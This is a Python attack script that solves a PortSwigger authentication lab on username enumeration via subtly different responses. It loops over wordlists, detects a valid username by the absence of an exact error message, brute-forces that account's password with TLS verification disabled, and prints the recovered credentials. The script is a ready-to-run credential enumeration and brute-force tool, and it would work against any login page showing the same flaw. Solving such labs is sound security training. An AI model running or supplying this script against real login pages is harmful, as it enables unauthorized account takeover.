import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def print_lab_info(url):
    info = f"""
+{'='*70}+

 PortSwigger Lab: Authentication vulnerabilities
 Challenge: Username enumeration via subtly different responses
 Target: {url}
 
 Lab Description:
  This lab is subtly vulnerable to username enumeration and password brute-force attacks. 
  It has an account with a predictable username and password, which can be found in the following wordlists:

  - Candidate usernames (./list/username.txt)
  - Candidate passwords (./list/password.txt)

  To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

+{'='*70}+
"""
    print(info)
    
def exploit_username_enumeration_via_subtly_different_responses(url) :
    session = requests.session()
    login_url = url + "/login"
    
    with open("./list/username.txt") as u_file, open("./list/password.txt") as p_file:
        users = [u.strip() for u in u_file]
        passwords = [p.strip() for p in p_file]
    
    real_username = None
    
    for user in users :
        login_data = {"username" : user, "password" : "test"}
        response = session.post(login_url, data=login_data, allow_redirects=False, verify=False)
        if "Invalid username or password." not in response.text :
            real_username = user
            break
        
    if real_username == None :
        print("[-] Not Found username")
        return
        
    for password in passwords :
        login_data = {"username" : real_username, "password" : password}
        response = session.post(login_url, data=login_data, allow_redirects=False, verify=False)
        if "Invalid username or password" not in response.text :
            print(f"[🎉] Exploit Success => username: {real_username}, password: {password}")  
            return
        
    print("[🧨] Exploit Failed")
    
def main() :
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
    
    url = sys.argv[1]
    print_lab_info(url)
    exploit_username_enumeration_via_subtly_different_responses(url)
    
if __name__ == "__main__" :
    main()